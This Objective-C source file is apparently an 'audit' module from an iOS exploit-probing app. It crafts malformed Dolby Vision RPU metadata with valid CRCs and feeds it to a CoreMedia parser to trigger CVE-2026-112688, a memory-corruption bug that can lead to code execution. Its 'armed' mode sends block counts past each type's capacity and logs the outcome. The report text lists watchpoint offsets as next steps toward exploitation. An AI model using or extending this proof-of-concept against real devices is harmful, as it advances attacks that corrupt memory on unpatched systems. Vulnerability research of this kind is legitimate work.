#import "KPAuditRPU112688Module.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <CoreMedia/CoreMedia.h>

extern int CMGetDMVersionLevelFromRPU(CFDataRef data);

// Known-good empty-dmv1 RBSP prefix (dovi_tool reference corpus, 112-byte
// rpu-reference-empty-rbsp.bin payload before extension blocks).
static const uint8_t kKPRPUReference[] = {
    0x19, 0x08, 0x09, 0x00, 0x40, 0x61, 0xb6, 0x50, 0x6f, 0x00, 0x3f, 0xf8,
    0x01, 0xff, 0xc0, 0x0f, 0xff, 0xd0, 0x00, 0x00, 0x08, 0x00, 0x00, 0x06,
    0x80, 0x00, 0x00, 0x40, 0x00, 0x00, 0x34, 0x00, 0x00, 0x03, 0x02, 0x00,
    0x00, 0x03, 0x01, 0xc9, 0x59, 0xc0, 0x00, 0x0e, 0x65, 0x89, 0x59, 0xfe,
    0x49, 0xbb, 0xb8, 0x49, 0x59, 0xd0, 0xf7, 0x00, 0x00, 0x03, 0x00, 0x40,
    0x00, 0x00, 0x03, 0x02, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 0x03,
    0x00, 0x05, 0xb5, 0x49, 0x79, 0x80, 0xd1, 0x42, 0x82, 0x0b, 0xf8, 0x01,
    0x86, 0x40, 0x00, 0x00, 0xa9, 0xcf, 0x56, 0x66, 0x66, 0x80, 0x60, 0x41,
    0x0c, 0xc0, 0x05, 0x47, 0x2d, 0x18, 0x08, 0x1f, 0x41, 0x08, 0x55, 0xe7,
    0x8d, 0xf9, 0xda, 0x80
};
static const size_t kKPRPUReferenceCountBit = 807;

@interface KPAuditRPU112688Module ()
@property (nonatomic, assign) BOOL armed;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditRPU112688Module

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"rpu112688.armed" : @"rpu112688.baseline";
        _title = armed ? @"CoreMedia RPU overrun (armed)" : @"CoreMedia RPU (baseline)";
        _subtitle = armed
            ? @"CVE-2026-112688: DOVI RPU ext-block counts past capacity (A10/B2/C6)"
            : @"Reference empty-dmv1 RBSP through CMGetDMVersionLevelFromRPU";
        _icon = armed ? @"film.stack" : @"film";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

#pragma mark - Bit-level builder (own implementation of the published grammar)

static void KPPushBits(NSMutableArray<NSNumber *> *bits, uint64_t value, NSUInteger width) {
    for (NSUInteger i = width; i > 0; i--) {
        [bits addObject:@((value >> (i - 1)) & 1)];
    }
}

static void KPPushUE(NSMutableArray<NSNumber *> *bits, uint64_t value) {
    uint64_t marker = value + 1;
    NSUInteger prefix = 0;
    uint64_t m = marker;
    while (m > 1) { m >>= 1; prefix++; }
    for (NSUInteger i = 0; i < prefix; i++) [bits addObject:@0];
    KPPushBits(bits, marker, prefix + 1);
}

static NSData *KPPackBits(NSArray<NSNumber *> *bits) {
    NSUInteger padded = (bits.count + 7) & ~(NSUInteger)7;
    NSMutableData *out = [NSMutableData dataWithLength:padded / 8];
    uint8_t *bytes = out.mutableBytes;
    for (NSUInteger i = 0; i < bits.count; i++) {
        if (bits[i].unsignedCharValue) {
            bytes[i / 8] |= (uint8_t)(0x80 >> (i % 8));
        }
    }
    return out;
}

static uint32_t KPCRC32MPEG2(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFFu;
    for (size_t i = 0; i < len; i++) {
        crc ^= (uint32_t)data[i] << 24;
        for (int b = 0; b < 8; b++) {
            crc = (crc & 0x80000000u) ? ((crc << 1) ^ 0x04C11DB7u) : (crc << 1);
        }
    }
    return crc;
}

- (NSData *)buildRPUWithBlockID:(uint8_t)blockID count:(uint32_t)count {
    NSMutableArray<NSNumber *> *bits = [NSMutableArray array];

    // De-escaped reference prefix, truncated at the extension-count field.
    NSMutableData *prefix = [NSMutableData data];
    NSUInteger i = 0;
    while (i + 3 < sizeof(kKPRPUReference)) {
        if (kKPRPUReference[i] == 0 && kKPRPUReference[i+1] == 0 &&
            kKPRPUReference[i+2] == 3 && kKPRPUReference[i+3] <= 3) {
            [prefix appendBytes:"\0\0" length:2];
            i += 3;
        } else {
            [prefix appendBytes:&kKPRPUReference[i] length:1];
            i++;
        }
    }
    const uint8_t *pbytes = prefix.bytes;
    for (size_t b = 0; b < kKPRPUReferenceCountBit / 8; b++) {
        KPPushBits(bits, pbytes[b], 8);
    }
    NSUInteger tail = kKPRPUReferenceCountBit % 8;
    if (tail) {
        KPPushBits(bits, pbytes[kKPRPUReferenceCountBit / 8] >> (8 - tail), tail);
    }

    KPPushUE(bits, count);
    while (bits.count % 8) [bits addObject:@0];
    for (uint32_t n = 0; n < count; n++) {
        KPPushUE(bits, 0);              // ext_block_length = 0 (empty payload)
        KPPushBits(bits, blockID, 8);   // u(8) level/block id
    }

    NSData *payload = KPPackBits(bits);
    uint32_t crc = KPCRC32MPEG2(payload.bytes, payload.length);
    NSMutableData *rpu = [payload mutableCopy];
    uint8_t crcBytes[4] = {
        (uint8_t)(crc >> 24), (uint8_t)(crc >> 16), (uint8_t)(crc >> 8), (uint8_t)crc
    };
    [rpu appendBytes:crcBytes length:4];
    uint8_t stop = 0x80;
    [rpu appendBytes:&stop length:1];
    return rpu;
}

#pragma mark - Parser call

- (NSDictionary *)callParserWithData:(NSData *)data label:(NSString *)label {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"label"] = label;
    result[@"bytes"] = @(data.length);
    CFDataRef cfData = CFDataCreate(kCFAllocatorDefault, data.bytes, (CFIndex)data.length);
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    int status = -1;
    @try {
        status = CMGetDMVersionLevelFromRPU(cfData);
    } @catch (NSException *exception) {
        result[@"exception"] = exception.reason ?: exception.name;
    }
    result[@"seconds"] = @(CFAbsoluteTimeGetCurrent() - t0);
    result[@"cm_status"] = @(status);
    if (cfData) CFRelease(cfData);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 audit · CVE-2026-112688 · CoreMedia RPU ===\n"];
    [report appendString:@"Apple 149230: file parsing -> memory corruption / ACE (fixed 27.2).\n"];
    [report appendString:@"Vector: DOVI RPU extension blocks past per-type capacity.\n"];
    [report appendString:@"Grammar: prefix[0:807bit] + ue(count) + per block ue(len)+u(8) id\n"];
    [report appendString:@"         + CRC-32/MPEG-2 over payload[1:] + 0x80 terminator.\n"];
    [report appendFormat:@"Target: iOS %@\n", UIDevice.currentDevice.systemVersion];

    NSData *baseline = [self buildRPUWithBlockID:0 count:0];
    [report appendFormat:@"baseline(empty): %@\n", [self callParserWithData:baseline label:@"empty"]];

    if (self.armed) {
        struct { uint8_t id; uint32_t capacity; const char *name; } cases[] = {
            {10, 4, "A10"}, {2, 8, "B2"}, {6, 5, "C6"}
        };
        for (size_t c = 0; c < 3; c++) {
            for (uint32_t over = 1; over <= 4; over++) {
                uint32_t count = cases[c].capacity + over;
                NSData *rpu = [self buildRPUWithBlockID:cases[c].id count:count];
                NSString *label = [NSString stringWithFormat:@"%s-o%u(id=%u,count=%u)",
                                   cases[c].name, over, cases[c].id, count];
                [report appendFormat:@"%@: %@\n", label, [self callParserWithData:rpu label:label]];
            }
        }
        [report appendString:@"\nVERDICT: SURVIVED\n"];
        [report appendString:
         @"Interpretation: parser returned without faulting for all overrun counts.\n"
         @"NOT a closure: (1) the overflow, if present, corrupts a stack struct and\n"
         @"may only manifest under debugger watchpoints (prior on-device A10/B2\n"
         @"one-over writes were breakpoint-proven, not crash-proven); (2) empty\n"
         @"payloads stress the count field only — valid-payload records (28/14/36\n"
         @"bytes per type) change the layout; (3) Apple's component is 'CoreMedia\n"
         @"parsing' and the exact file type is unconfirmed.\n"
         @"Decisive next step: repeat under debugserver with watchpoints on the\n"
         @"record-store area (struct+0x7338 / +0x71dc / +0x726c).\n"];
    } else {
        NSData *one = [self buildRPUWithBlockID:1 count:1];
        [report appendFormat:@"safe-single-block: %@\n", [self callParserWithData:one label:@"single"]];
        [report appendString:@"\nVERDICT: SURVIVED (control)\n"];
    }
    return report;
}

@end
